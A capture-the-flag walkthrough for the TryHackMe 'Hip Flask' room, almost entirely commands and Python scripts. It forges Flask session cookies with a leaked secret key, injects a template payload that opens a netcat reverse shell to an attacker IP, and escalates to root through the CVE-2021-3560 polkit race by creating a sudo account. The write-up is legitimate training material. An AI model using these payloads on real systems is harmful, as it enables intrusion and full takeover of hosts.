# Hip Flask

**Room Link:** [https://tryhackme.com/r/room/hipflask](https://tryhackme.com/r/room/hipflask)

## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (906).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>

## **UDP/53 - DNS**

<figure><img src="../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "$VICTIM hipflasks.thm" >> /etc/hosts
```

**Kali**

```
dig -t AXFR hipflasks.thm @$VICTIM
```

<figure><img src="../../.gitbook/assets/image (909).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo "$VICTIM hipflasks.thm hipper.hipflasks.thm" >> /etc/hosts
```

## **TCP/80:443 - HTTP(s)**

**Kali**

```
gobuster  dir -u https://hipper.hipflasks.thm -k -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (912).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (910).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
gobuster  dir -u https://hipper.hipflasks.thm -k -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x py  
```

<figure><img src="../../.gitbook/assets/image (913).png" alt=""><figcaption></figcaption></figure>

**main.py**

There is a secret key in this file&#x20;

```
#!/usr/bin/python3
from flask import Flask, redirect, render_template, request, session
from datetime import datetime
from waitress import serve
from modules import abp
from libs.db import AuthConn, StatsConn

app = Flask(__name__)
app.template_folder="views"
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"


@app.before_request
def befReq():
	conn = StatsConn()
	if not session.get("visited"):
		conn.addView("uniqueViews")
		session["visited"] = "True"
	conn.addView("totalViews")


@app.route("/")
def home():
	return render_template("index.html", year=datetime.now().date().strftime("%Y")), 200

app.register_blueprint(abp, url_prefix="/admin")


@app.errorhandler(403)
def error403(e):
	return "You are not authorised to access this", 403


#Confirm that there is an admin account in place
AuthConn()

serve(app, host="127.0.0.1", port=8000)

```





**Kali(poc-venv)**

```
sudo apt update && sudo apt install python3-venv
python3 -m venv poc-venv
source poc-venv/bin/activate
pip3 install flask requests waitress
```

**Kali(poc-venv)**

```
subl poc.py
```



**poc.py**

```
#!/usr/bin/env python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "Pentester"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

**Kali(poc-venv)**

```
python poc.py 
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Copy the token to firefox and then we can login

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali(poc-venv)**

```
subl poc2.py
```

Changing the code to see if it will evaluate 7\*6 in the username field

**poc2.py**

```
#!/usr/bin/python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = "{{7*6}}"
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

**Kali(poc-venv)**

```
python poc2.py
```

Do the same steps as before to use the cookie and you can see the username is now 42

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## **Inital Shell**

**Kali(poc-venv)**

```
subl poc3.py
```

Changing the code to see if it will evaluate 7\*6 in the username field

**poc3.py**

```
#!/usr/bin/python3
from flask import Flask, session, request
from waitress import serve
import requests, threading, time

#Flask Initialisation
app = Flask(__name__)
app.config["SECRET_KEY"] = "43961b349373988c271babcbb6e55347"

@app.route("/")
def main():
    session["auth"] = "True"
    session["username"] = """{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/ZTQ0Y; nc 10.10.127.179 443 0</tmp/ZTQ0Y | /bin/sh >/tmp/ZTQ0Y 2>&1; rm /tmp/ZTQ0Y').read()}}"""
    return "Check your cookies", 200

#Flask setup/start
thread = threading.Thread(target = lambda: serve(app, port=9000, host="127.0.0.1"))
thread.setDaemon(True)
thread.start()

#Request
time.sleep(1)
print(requests.get("http://localhost:9000/").cookies.get("session"))
```

**Kali**

```
nc lvnp 443
```

**Kali(poc-venv)**

```
python poc3.py
```

Copy the cookie into the browser again and shortly you should receive a connection to your netcat listener.&#x20;

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



## Privilege Escalation&#x20;

Get autocomplete

**Victim**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + Z
stty raw -echo;fg
```

CVE-2021-3560 is, fortunately, a very easy vulnerability to exploit if the conditions are right. The vuln is effectively a race condition in the policy toolkit authentication system.

There is already a TryHackMe room which covers this vulnerability in much more depth [here](https://tryhackme.com/room/polkit), so please complete that before continuing if you haven't already done so as we will not cover the "behind the scenes" of the vuln in nearly as much depth here.

Effectively, we need to send a custom dbus message to the accounts-daemon, and kill it approximately halfway through execution (after it gets received by polkit, but before polkit has a chance to verify that it's legitimate -- or, not, in this case).

We will be trying to create a new account called "attacker" with sudo privileges. Before we do so, let's check to see if an account with this name already exists:

**Victim**

```
apt list --upgradeable
```

<figure><img src="../../.gitbook/assets/image (914).png" alt=""><figcaption></figcaption></figure>

This attempts to create our new account, and times how long it takes for the command to finish. In the target machine this should be _about_ 11 milliseconds. It took us 13 milliseconds

**Victim**

```
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
```

<figure><img src="../../.gitbook/assets/image (915).png" alt=""><figcaption></figcaption></figure>

We now need to take the same dbus message, send it, then cut it off at about halfway through execution. 5 milliseconds tends to work fairly well for this box.

_**Note:** you may need to repeat this a few times with different delays before the account is created._

**Victim**

```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
```

<figure><img src="../../.gitbook/assets/image (916).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
id attacker
```

<figure><img src="../../.gitbook/assets/image (917).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' string:'Ask the pentester' & sleep 0.005s; kill $!
```

<figure><img src="../../.gitbook/assets/image (918).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su attacker
Password: Expl01ted
```

<figure><img src="../../.gitbook/assets/image (919).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo -i
Password: Expl01ted
```

<figure><img src="../../.gitbook/assets/image (920).png" alt=""><figcaption></figcaption></figure>

